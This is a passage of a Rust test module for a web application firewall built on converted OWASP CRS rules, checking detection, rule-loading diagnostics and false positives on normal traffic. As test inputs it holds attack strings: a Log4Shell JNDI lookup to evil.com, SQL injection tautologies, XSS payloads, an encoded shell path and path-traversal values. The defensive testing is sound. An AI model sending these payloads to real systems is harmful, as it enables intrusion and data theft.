    /// A context carrying a single header (and nothing else that could match).
    fn make_ctx_with_header(name: &str, value: &str) -> RequestCtx {
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.headers.insert(name.into(), value.into());
        ctx
    }

    fn single_rule_yaml(field: &str, operator: &str, value: &str) -> String {
        format!(
            "version: \"1.0\"\nrules:\n  - id: TEST-RULE\n    name: test rule\n    category: test\n    \
             severity: critical\n    paranoia: 1\n    field: {field}\n    operator: {operator}\n    \
             value: {value}\n    action: block\n"
        )
    }

    #[test]
    fn test_invalid_method_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("FOOBAR", "/", 0);
        assert!(checker.check(&ctx).is_some(), "FOOBAR method should be blocked");
    }

    #[test]
    fn test_valid_method_allowed() {
        let checker = OWASPCheck::new();
        for method in &["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] {
            let ctx = make_ctx(method, "/", 0);
            assert!(
                checker.check(&ctx).is_none(),
                "{method} should be allowed by OWASP method check"
            );
        }
    }

    #[test]
    fn test_large_body_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("POST", "/upload", 11 * 1024 * 1024); // 11 MB
        assert!(checker.check(&ctx).is_some(), "11MB body should be blocked");
    }

    #[test]
    fn test_log4shell_blocked() {
        let checker = OWASPCheck::new();
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.path = "${jndi:ldap://evil.com/a}".into();
        assert!(checker.check(&ctx).is_some());
    }

    // ── detect_sqli tests ────────────────────────────────────────────────────

    const SQLI_RULE_YAML: &str = r#"
version: "1.0"
rules:
  - id: CRS-942100
    name: SQL Injection Attack Detected via libinjection
    category: sqli
    severity: critical
    paranoia: 1
    field: all
    operator: detect_sqli
    value: ""
    action: block
"#;

    #[test]
    fn detect_sqli_blocks_or_tautology() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        assert_eq!(checker.rule_count(), 1);
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        let result = checker.check(&ctx);
        assert!(result.is_some(), "Should detect SQL injection tautology");
    }

    #[test]
    fn detect_sqli_blocks_union_select() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_query("id=1 UNION SELECT 1,2,3--");
        assert!(checker.check(&ctx).is_some(), "Should detect UNION SELECT injection");
    }

    #[test]
    fn detect_sqli_allows_clean_input() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_query("name=alice&page=2");
        assert!(checker.check(&ctx).is_none(), "Should allow clean query string");
    }

    #[test]
    fn detect_sqli_checks_body() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("POST", "/login", 0);
        ctx.body_preview = Bytes::from("username=admin&password=1' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in body");
    }

    #[test]
    fn detect_sqli_checks_headers() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_header("referer", "http://x/' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in headers");
    }

    // ── detect_xss tests ─────────────────────────────────────────────────────

    const XSS_RULE_YAML: &str = r#"
version: "1.0"
rules:
  - id: CRS-941100
    name: XSS Attack Detected via libinjection
    category: xss
    severity: critical
    paranoia: 1
    field: all
    operator: detect_xss
    value: ""
    action: block
"#;

    #[test]
    fn detect_xss_blocks_script_tag() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        assert_eq!(checker.rule_count(), 1);
        let ctx = make_ctx_with_query("q=<script>alert(1)</script>");
        assert!(checker.check(&ctx).is_some(), "Should detect script tag XSS");
    }

    #[test]
    fn detect_xss_blocks_event_handler() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx_with_query("q=<img src=x onerror=alert(1)>");
        assert!(checker.check(&ctx).is_some(), "Should detect event handler XSS");
    }

    #[test]
    fn detect_xss_allows_clean_input() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx_with_query("q=hello+world&page=1");
        assert!(checker.check(&ctx).is_none(), "Should allow clean input");
    }

    #[test]
    fn detect_xss_checks_body() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let mut ctx = make_ctx("POST", "/comment", 0);
        ctx.body_preview = Bytes::from("text=<script>alert('xss')</script>");
        assert!(checker.check(&ctx).is_some(), "Should detect XSS in body");
    }

    // ── compile_rule operator alias tests ────────────────────────────────────

    #[test]
    fn detect_sqli_modsec_alias_works() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "\"@detectSQLi\"", "\"\""));
        assert_eq!(checker.rule_count(), 1, "@detectSQLi alias should compile");
    }

    #[test]
    fn detect_xss_modsec_alias_works() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "\"@detectXSS\"", "\"\""));
        assert_eq!(checker.rule_count(), 1, "@detectXSS alias should compile");
    }

    // ── single-field detection tests ─────────────────────────────────────────

    #[test]
    fn detect_sqli_single_field_query() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "detect_sqli", "\"\""));
        // Should detect in query
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in query field");
        // Should NOT detect in path when field is query-only
        let ctx2 = make_ctx("GET", "/1' OR '1'='1", 0);
        assert!(checker.check(&ctx2).is_none(), "Should not check path when field=query");
    }

    // ── URL-encoded evasion tests ────────────────────────────────────────────

    #[test]
    fn detect_sqli_url_encoded_evasion() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        // %27 = single quote, %20 = space, %3D = equals
        let ctx = make_ctx_with_query("id=1%27%20OR%20%271%27%3D%271");
        assert!(
            checker.check(&ctx).is_some(),
            "Should detect URL-encoded SQLi after decoding"
        );
    }

    #[test]
    fn detect_xss_url_encoded_evasion() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        // %3Cscript%3E = <script>
        let ctx = make_ctx_with_query("q=%3Cscript%3Ealert(1)%3C/script%3E");
        assert!(
            checker.check(&ctx).is_some(),
            "Should detect URL-encoded XSS after decoding"
        );
    }

    // ── Edge case tests ──────────────────────────────────────────────────────

    #[test]
    fn detect_sqli_empty_input_safe() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger SQLi");
    }

    #[test]
    fn detect_xss_empty_input_safe() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger XSS");
    }

    #[test]
    fn detect_sqli_non_utf8_body() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("POST", "/", 0);
        // Binary payload with some valid SQL-like bytes mixed in
        ctx.body_preview = Bytes::from(vec![0xFF, 0xFE, 0x00, 0x80]);
        assert!(
            checker.check(&ctx).is_none(),
            "Random binary data should not trigger SQLi"
        );
    }

    #[test]
    fn detect_sqli_paranoia_level_filtering() {
        let yaml = r#"
version: "1.0"
rules:
  - id: CRS-942100-PL3
    name: SQLi detection at paranoia level 3
    category: sqli
    severity: critical
    paranoia: 3
    field: all
    operator: detect_sqli
    value: ""
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        // Default paranoia is 1, so PL3 rule should be skipped
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        assert!(
            checker.check(&ctx).is_none(),
            "PL3 rule should be skipped at default paranoia level 1"
        );
    }

    // ── A.1: unsupported field / operator must be rejected, never silent ─────

    #[test]
    fn unsupported_field_is_rejected_and_reported() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("response_body", "regex", "'.*'"));
        let summary = checker.load_summary();

        assert_eq!(checker.rule_count(), 0, "unsupported field must not be counted");
        assert_eq!(summary.attempted, 1);
        assert_eq!(summary.compiled, 0);
        assert_eq!(summary.rejected_field_count(), 1);
        assert_eq!(summary.rejected_field_ids(), vec!["TEST-RULE"]);
        assert!(summary.is_degraded());
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::UnsupportedField(f)) if f == "response_body"
        ));
    }

    #[test]
    fn unsupported_operator_is_rejected_and_reported() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "validate_byte_range", "'1-255'"));
        let summary = checker.load_summary();

        assert_eq!(checker.rule_count(), 0, "unsupported operator must not be counted");
        assert_eq!(summary.rejected_operator_count(), 1);
        assert_eq!(summary.rejected_operator_ids(), vec!["TEST-RULE"]);
        assert_eq!(summary.rejected_field_count(), 0);
        assert!(summary.is_degraded());
    }

    #[test]
    fn scalar_operator_on_collection_field_is_rejected() {
        // `equals` / `gt` compare one value; `all` and `cookies` expand to many,
        // and the schema cannot express the CRS collection-member selector.
        for (field, operator, value) in [("cookies", "equals", "'1'"), ("all", "gt", "'0'")] {
            let checker = OWASPCheck::from_yaml(&single_rule_yaml(field, operator, value));
            let summary = checker.load_summary();
            assert_eq!(checker.rule_count(), 0, "{operator} on {field} must be rejected");
            assert_eq!(summary.count(RejectCategory::FieldOperatorMismatch), 1);
            assert_eq!(
                summary.rule_ids(RejectCategory::FieldOperatorMismatch),
                vec!["TEST-RULE"]
            );
        }
    }

    #[test]
    fn wrong_value_type_is_rejected_not_silently_dropped() {
        // `gt` with a string value used to vanish without any log at all.
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("content_length", "gt", "'0'"));
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 1);
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::InvalidValueType { expected, .. }) if *expected == "integer"
        ));
    }

    #[test]
    fn invalid_regex_is_rejected_and_categorised() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "regex", "'a('"));
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 1);
        assert!(matches!(
            summary.rejected.first().map(|r| &r.reason),
            Some(RejectReason::InvalidRegex(_))
        ));
    }

    #[test]
    fn summary_accounts_for_every_declared_rule() {
        let yaml = r#"
version: "1.0"
rules:
  - id: OK-1
    name: supported
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: contains
    value: evil
    action: block
  - id: BAD-FIELD
    name: unsupported field
    category: test
    severity: critical
    paranoia: 1
    field: response_body
    operator: contains
    value: evil
    action: block
  - id: BAD-OP
    name: unsupported operator
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: verify_cc
    value: evil
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        let summary = checker.load_summary();
        assert_eq!(summary.attempted, 3);
        assert_eq!(summary.compiled, 1);
        assert_eq!(checker.rule_count(), 1);
        assert_eq!(summary.rejected.len(), 2);
        assert_eq!(summary.attempted, summary.compiled + summary.rejected.len());
        assert_eq!(summary.rejected_field_ids(), vec!["BAD-FIELD"]);
        assert_eq!(summary.rejected_operator_ids(), vec!["BAD-OP"]);
    }

    // ── A.2: load failures must not degrade silently ─────────────────────────

    #[test]
    fn yaml_parse_failure_is_recorded_not_silent() {
        let checker = OWASPCheck::from_yaml("rules: [ this is not: valid: yaml");
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.source_errors.len(), 1, "parse failure must be recorded");
        assert!(summary.is_degraded(), "an unparsable source is a degraded load");
        assert_eq!(summary.attempted, 0);
    }

    #[test]
    fn unreadable_directory_is_recorded_not_silent() {
        let missing = Path::new(env!("CARGO_MANIFEST_DIR")).join("does-not-exist-owasp-rules");
        let checker = OWASPCheck::from_directory(&missing);
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.source_errors.len(), 1);
        assert!(summary.is_degraded());
    }

    #[test]
    fn embedded_fallback_is_flagged_in_the_summary() {
        // Tests run from the crate directory, where `rules/owasp-crs/` does not
        // exist, so `new()` takes the embedded-fallback path.
        let checker = OWASPCheck::new();
        assert!(checker.rule_count() > 0, "fallback must still enforce something");
        assert!(
            checker.load_summary().used_embedded_fallback,
            "fallback substitution must be visible in the summary"
        );
        assert!(checker.load_summary().is_degraded());
    }

    // ── B: newly supported fields ────────────────────────────────────────────

    #[test]
    fn cookies_field_matches_individual_cookie_values() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("cookies", "contains", "evil"));
        assert_eq!(checker.rule_count(), 1);

        let hit = make_ctx_with_header("cookie", "sid=abc; theme=evil-dark; lang=en");
        assert!(checker.check(&hit).is_some(), "cookie value should match");

        let miss = make_ctx_with_header("cookie", "sid=abc; theme=dark");
        assert!(checker.check(&miss).is_none(), "clean cookies must not match");
    }

    #[test]
    fn cookies_field_ignores_cookie_names() {
        // CRS `REQUEST_COOKIES` is the *values* collection; a name-only match
        // would silently widen the rule.
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("cookies", "contains", "evil"));
        let ctx = make_ctx_with_header("cookie", "evil=1");
        assert!(checker.check(&ctx).is_none(), "cookie names are not values");
    }

    #[test]
    fn header_referer_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header_referer", "regex", "'#.*'"));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("referer", "http://site/page#frag");
        assert!(checker.check(&hit).is_some());
        let miss = make_ctx_with_header("referer", "http://site/page");
        assert!(checker.check(&miss).is_none());
        let absent = make_ctx("GET", "/", 0);
        assert!(checker.check(&absent).is_none(), "absent header must not match");
    }

    #[test]
    fn header_host_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "header_host",
            "regex",
            "'(?:^([\\d.]+|\\[[\\da-f:]+\\]|[\\da-f:]+)(:[\\d]+)?$)'",
        ));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("host", "192.168.1.10:8080");
        assert!(checker.check(&hit).is_some(), "numeric Host must match CRS-920350");
        let miss = make_ctx_with_header("host", "example.com");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn header_host_field_reads_the_header_not_the_vhost() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("header_host", "contains", "example.com"));
        // ctx.host is "example.com" but no Host header is present: matching the
        // configured vhost instead of the header would be a false positive.
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none());
    }

    #[test]
    fn header_range_field_positive_and_negative() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "header_range",
            "regex",
            "'^bytes=(?:(?:\\d+)?-(?:\\d+)?\\s*,?\\s*){6}'",
        ));
        assert_eq!(checker.rule_count(), 1);
        let hit = make_ctx_with_header("range", "bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7");
        assert!(checker.check(&hit).is_some(), "6+ range fields must match");
        let miss = make_ctx_with_header("range", "bytes=0-1023");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn headers_field_scans_every_header_name_and_value() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("headers", "contains", "'x-evil'"));
        assert_eq!(checker.rule_count(), 1);

        // Matches on a header *name* (CRS REQUEST_HEADERS_NAMES).
        let by_name = make_ctx_with_header("x-evil-marker", "1");
        assert!(checker.check(&by_name).is_some(), "header names must be scanned");

        // Matches on a header *value*, including headers outside the curated
        // SCANNED_HEADERS list used by the heuristic checks.
        let by_value = make_ctx_with_header("x-custom-tenant", "x-evil");
        assert!(checker.check(&by_value).is_some(), "all header values must be scanned");

        let miss = make_ctx_with_header("accept", "text/html");
        assert!(checker.check(&miss).is_none());
    }

    // ── B: newly supported operators ─────────────────────────────────────────

    #[test]
    fn contains_any_matches_whitespace_separated_phrases() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml(
            "all",
            "contains_any",
            "'document.cookie window.location -moz-binding'",
        ));
        assert_eq!(checker.rule_count(), 1);

        let hit = make_ctx_with_query("q=alert(DOCUMENT.COOKIE)");
        assert!(checker.check(&hit).is_some(), "phrase match must be case-insensitive");

        let miss = make_ctx_with_query("q=hello+world");
        assert!(checker.check(&miss).is_none());
    }

    #[test]
    fn contains_any_matches_url_encoded_payload() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("all", "contains_any", "'-moz-binding'"));
        let ctx = make_ctx_with_query("q=%2Dmoz%2Dbinding");
        assert!(checker.check(&ctx).is_some(), "CRS @pm runs after urlDecodeUni");
    }

    #[test]
    fn contains_any_accepts_a_yaml_list() {
        let yaml = "version: \"1.0\"\nrules:\n  - id: TEST-RULE\n    name: t\n    category: test\n    \
                    severity: critical\n    paranoia: 1\n    field: query\n    operator: contains_any\n    \
                    value:\n      - alpha\n      - beta\n    action: block\n";
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx_with_query("x=BETA")).is_some());
        assert!(checker.check(&make_ctx_with_query("x=gamma")).is_none());
    }

    #[test]
    fn contains_any_with_no_phrases_is_rejected() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "contains_any", "'   '"));
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(checker.load_summary().count(RejectCategory::InvalidValue), 1);
    }

    #[test]
    fn equals_operator_is_exact_and_case_sensitive() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("method", "equals", "TRACE"));
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx("TRACE", "/", 0)).is_some());
        assert!(
            checker.check(&make_ctx("trace", "/", 0)).is_none(),
            "@streq is case-sensitive"
        );
        assert!(checker.check(&make_ctx("GET", "/", 0)).is_none());
    }

    // ── B: pm_from_file ──────────────────────────────────────────────────────

    #[test]
    fn pm_from_file_loads_wordlist_and_matches() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("path", "pm_from_file", "restricted-files.data"),
            &crs_data_dir(),
        );
        assert_eq!(checker.rule_count(), 1, "wordlist rule must compile");

        let hit = make_ctx("GET", "/app/.htaccess", 0);
        assert!(checker.check(&hit).is_some(), "restricted file must match");

        let miss = make_ctx("GET", "/index.html", 0);
        assert!(checker.check(&miss).is_none(), "ordinary path must not match");
    }

    #[test]
    fn pm_from_file_matches_url_encoded_payload() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("query", "pm_from_file", "unix-shell.data"),
            &crs_data_dir(),
        );
        assert_eq!(checker.rule_count(), 1);
        // "/bin/bash" percent-encoded.
        let ctx = make_ctx_with_query("cmd=%2Fbin%2Fbash");
        assert!(checker.check(&ctx).is_some(), "CRS @pmFromFile runs after urlDecodeUni");
    }

    #[test]
    fn pm_from_file_missing_wordlist_is_rejected() {
        let checker = OWASPCheck::from_yaml_with_data_dir(
            &single_rule_yaml("query", "pm_from_file", "no-such-list.data"),
            &crs_data_dir(),
        );
        let summary = checker.load_summary();
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(summary.count(RejectCategory::DataFile), 1);
        assert_eq!(summary.rule_ids(RejectCategory::DataFile), vec!["TEST-RULE"]);
    }

    #[test]
    fn pm_from_file_rejects_path_traversal() {
        for name in ["'../secrets.data'", "'/etc/passwd'"] {
            let checker =
                OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", name), &crs_data_dir());
            assert_eq!(checker.rule_count(), 0, "{name} must not escape the data dir");
            assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);
        }
    }

    #[test]
    fn pm_from_file_without_data_dir_is_rejected_not_skipped() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query", "pm_from_file", "unix-shell.data"));
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);
    }

    #[test]
    fn wordlist_parsing_skips_comments_and_blanks() {
        let dir = std::env::temp_dir().join(format!("prx-waf-owasp-wordlist-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("list.data");
        std::fs::write(&path, "# a comment\n\n  spaced-entry  \nplain\n").unwrap();

        let checker =
            OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", "list.data"), &dir);
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx_with_query("x=spaced-entry")).is_some());
        assert!(checker.check(&make_ctx_with_query("x=plain")).is_some());
        assert!(
            checker.check(&make_ctx_with_query("x=a comment")).is_none(),
            "comment lines must not become patterns"
        );

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn empty_wordlist_is_rejected() {
        let dir = std::env::temp_dir().join(format!("prx-waf-owasp-empty-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("empty.data"), "# only comments\n\n").unwrap();

        let checker =
            OWASPCheck::from_yaml_with_data_dir(&single_rule_yaml("query", "pm_from_file", "empty.data"), &dir);
        assert_eq!(checker.rule_count(), 0);
        assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);

        std::fs::remove_dir_all(&dir).ok();
    }

    // ── Shipped rule-set inventory ───────────────────────────────────────────

    /// Reconciliation baseline for the shipped CRS conversion.
    ///
    /// These numbers are the accounting basis for external conformance runs.
    /// If `rules/owasp-crs/` is re-synced from upstream this test is expected
    /// to fail — update it deliberately and re-publish the coverage figures.
    #[test]
    fn shipped_crs_inventory_is_fully_accounted_for() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let summary = checker.load_summary();

        assert!(summary.source_errors.is_empty(), "shipped rule set must parse cleanly");
        assert_eq!(summary.attempted, 328, "declared CRS rules");
        assert_eq!(summary.compiled, 215, "enforceable CRS rules");
        assert_eq!(checker.rule_count(), summary.compiled);
        assert_eq!(summary.attempted, summary.compiled + summary.rejected.len());

        // Nothing is enforced in a form the upstream rule would not recognise.
        // Every rejection names the `ModSecurity` construct this engine cannot
        // evaluate, so the startup WARN doubles as the "not supported yet"
        // inventory.  Re-syncing CRS is expected to move these numbers.
        let by_field = |name: &str| {
            summary
                .rejected
                .iter()
                .filter(|r| matches!(&r.reason, RejectReason::UnsupportedField(f) if f == name))
                .count()
        };
        // The CRS 95x block is response-phase in its entirety, and two
        // conversions of it ship side by side (the `CRS-95xxxx` files produced
        // by the current `modsec2yaml.py` and the older `CRS-RESP-95xxxx`
        // `response-*.yaml` files), so most 95x rules appear twice.
        assert_eq!(by_field("response_body"), 99, "RESPONSE_BODY");
        assert_eq!(by_field("response_status"), 3, "RESPONSE_STATUS / RESPONSE_PROTOCOL");
        // `FILES` / `FILES_NAMES` / `REQUEST_HEADERS:X-Filename`: uploaded file
        // names.  CRS-933110 and CRS-944140 test them with `.*\.php$` style
        // patterns, so running them over the whole request blocked every
        // request to a `.php` or `.jsp` URL.
        assert_eq!(by_field("unmapped_files"), 5, "CRS 932180/933110/933111/933220/944140");
        // `MULTIPART_PART_HEADERS`: the headers of each multipart part.  The
        // engine sees the raw body, not parsed parts.
        assert_eq!(
            by_field("unmapped_multipart_part_headers"),
            2,
            "CRS-922120 / CRS-922130"
        );
        // `&REQUEST_HEADERS:Range` is a *count*, not a value.
        assert_eq!(by_field("unmapped_count_request_headers_range"), 1, "CRS-921230");
        // CRS-931130's chained condition reads `TX:/rfi_parameter_.*/`, a
        // collection an earlier `setvar` in the same rule built.  The converter
        // models no variable store, so the rule is refused whole: its first
        // condition alone is "block any argument containing `scheme://`".
        assert_eq!(by_field("unmapped_chained_tx_variable"), 1, "CRS-931130");
        // CRS-942130's chained `TX:1 @streq %{TX.2}` asserts that two captures
        // of one *parameter* are the same word.  The engine has no ARGS
        // splitter, so it sees the whole query string, where the `name=value`
        // separator forms that equality by itself: `?tab=tab` would read as a
        // `1=1` tautology.
        assert_eq!(by_field("unmapped_chained_args_self_equality"), 1, "CRS-942130");
        assert_eq!(summary.rejected_field_count(), 112, "rules the engine cannot evaluate");
        assert!(
            summary
                .rejected
                .iter()
                .filter(|r| r.reason.category() == RejectCategory::UnsupportedField)
                .all(|r| matches!(&r.reason, RejectReason::UnsupportedField(f)
                    if f.starts_with("response_") || f.starts_with("unmapped_"))),
            "an unsupported field must be a response-phase or unmapped-variable marker"
        );
        assert_eq!(
            summary.rejected_operator_count(),
            0,
            "all CRS operators are implemented"
        );
        // CRS-921250 applies `@streq` to `REQUEST_COOKIES`, a collection.
        assert_eq!(summary.count(RejectCategory::FieldOperatorMismatch), 1);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 0);
        assert_eq!(summary.count(RejectCategory::DataFile), 0, "every wordlist must load");
        // A chained rule the converter could not express is refused by its
        // `field`, before the chain is even looked at; this category only fires
        // for a hand-written rule file.
        assert_eq!(summary.count(RejectCategory::Chain), 0);

        // Every `ModSecurity` `chain` in the shipped set is enforced with all
        // of its conditions, or not at all.  Enforcing only the first condition
        // is what made CRS-944110 block any request mentioning "runtime".
        let chained: Vec<&str> = checker
            .rules
            .iter()
            .filter(|r| !r.chain.is_empty())
            .map(|r| r.id.as_str())
            .collect();
        assert_eq!(
            chained,
            [
                "CRS-944110",
                "CRS-944120",
                "CRS-933150",
                "CRS-920200",
                "CRS-932200",
                "CRS-932205",
                "CRS-932206",
                "CRS-932207",
                "CRS-932240",
                "CRS-943110",
                "CRS-943120",
                "CRS-942131",
                "CRS-942440",
                "CRS-942521",
                "CRS-941310",
            ],
            "chained rules enforced in full"
        );

        // `all` walks every request header value, so it is reserved for the
        // rules whose upstream variable list really is the whole request.  The
        // rest name the surfaces they read.  If a re-sync pushes this back up,
        // the converter's surface mapping has regressed.
        let catch_all = checker
            .rules
            .iter()
            .filter(|r| r.head.field == CondField::Request(Field::Multi(Surfaces::ALL)))
            .count();
        assert_eq!(catch_all, 6, "rules scanning the entire request");

        // No rule from the response-phase conversion may end up enforced: their
        // patterns describe server *output* and matching them against a request
        // is a pure false positive.
        let leaked: Vec<&str> = checker
            .rules
            .iter()
            .map(|r| r.id.as_str())
            .filter(|id| id.starts_with("CRS-RESP-"))
            .collect();
        assert!(
            leaked.is_empty(),
            "response-phase rules must not be enforced: {leaked:?}"
        );
    }

    /// A request built from parts, for probing the shipped rule set the way a
    /// real client would exercise it.
    fn probe(method: &str, path: &str, query: &str, headers: &[(&str, &str)], body: &str, paranoia: u8) -> RequestCtx {
        let mut ctx = make_ctx(method, path, body.len() as u64);
        ctx.query = query.into();
        ctx.body_preview = Bytes::copy_from_slice(body.as_bytes());
        for (name, value) in headers {
            ctx.headers.insert((*name).into(), (*value).into());
        }
        let dc = DefenseConfig {
            owasp_set: true,
            owasp_paranoia: paranoia,
            ..DefenseConfig::default()
        };
        ctx.host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        ctx
    }

    /// The headers an ordinary browser sends.
    fn browser_headers() -> Vec<(&'static str, &'static str)> {
        vec![
            (
                "user-agent",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
            ),
            (
                "accept",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            ),
            ("accept-encoding", "gzip, deflate, br, zstd"),
            ("accept-language", "en-GB,en;q=0.9"),
            ("referer", "https://shop.example.com/products?page=2&sort=price"),
            ("cookie", "session=8f3ab21c9de4; locale=en_GB; cart_items=3"),
        ]
    }

    const MULTIPART_UPLOAD: &str = "------WebKitFormBoundaryABC\r\n\
Content-Disposition: form-data; name=\"file\"; filename=\"quarterly-report.pdf\"\r\n\
Content-Type: application/pdf\r\n\r\n\
%PDF-1.4 quarterly figures\r\n\
------WebKitFormBoundaryABC--\r\n";

    /// Ordinary traffic that the shipped CRS conversion used to block.
    ///
    /// Every entry here was verified to be blocked before the variable mapping
    /// was corrected, and the rule that blocked it is named.  The common cause
    /// was a `ModSecurity` variable the converter did not recognise, or a
    /// narrow one it widened: the rule then ran against request surfaces its
    /// pattern was never written for.
    #[test]
    fn crs_conversion_does_not_block_ordinary_traffic() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let browser = browser_headers();
        let form = [
            ("content-type", "application/x-www-form-urlencoded"),
            ("cookie", "session=8f3ab21c9de4"),
        ];

        let cases: Vec<(&str, RequestCtx)> = vec![
            // CRS-933150 matches the PHP function name `urlencode`, and
            // `application/x-www-form-urlencoded` contains it: with the rule on
            // a field that walks header values, every HTML form POST was
            // blocked at the default paranoia level.
            (
                "urlencoded form POST",
                probe(
                    "POST",
                    "/account/settings",
                    "",
                    &form,
                    "display_name=Jo+Smith&api_key=k_live_9f2&timezone=Europe%2FLondon",
                    1,
                ),
            ),
            // CRS-941130 matches `xhtml`, which every browser sends in `Accept`.
            (
                "plain browser page view",
                probe("GET", "/products/laptop-pro-14", "page=2&sort=price", &browser, "", 1),
            ),
            // CRS-933110 / CRS-944140 test *uploaded file names* for a script
            // extension.  Run over the whole request they matched the URL path.
            (
                "GET a .php URL",
                probe("GET", "/wp-admin/admin-ajax.php", "action=heartbeat", &browser, "", 1),
            ),
            (
                "GET a .phtml URL",
                probe("GET", "/app/legacy.phtml", "", &browser, "", 1),
            ),
            (
                "GET a .jsp URL",
                probe("GET", "/portal/dashboard.jsp", "tab=1", &browser, "", 1),
            ),
            (
                "Referer pointing at a .php page",
                probe("GET", "/", "", &[("referer", "https://shop.example/cart.php")], "", 1),
            ),
            // CRS-922130 reads `MULTIPART_PART_HEADERS`; over the whole request
            // its pattern reduces to "whitespace, a word, a colon".
            (
                "shebang + YAML request body",
                probe("POST", "/api/save", "", &[], "#!/opt/app/runner\nname: demo", 1),
